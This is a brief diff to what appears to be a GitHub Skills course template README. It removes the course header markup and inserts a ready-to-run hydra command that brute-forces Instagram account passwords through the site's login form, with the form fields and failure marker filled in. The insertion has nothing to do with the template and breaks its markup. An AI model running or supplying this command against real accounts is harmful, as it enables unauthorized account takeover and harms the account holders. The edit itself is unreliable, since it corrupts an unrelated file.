@@ -1,5 +1,5 @@
-<header>
-
+<>
+hydra -l <username> -P <password_list.txt> instagram.com https-post-form "/accounts/login/ajax/:username=^USER^&password=^PASS^&queryParams=%7B%22name%22%3A%22login%22%2C%22station%22%3A%22web%22%7D=:F=incorrect"
 <!--
   <<< Author notes: Course header >>>
   Read <https://skills.github.com/quickstart> for more information about how to build courses using this template.
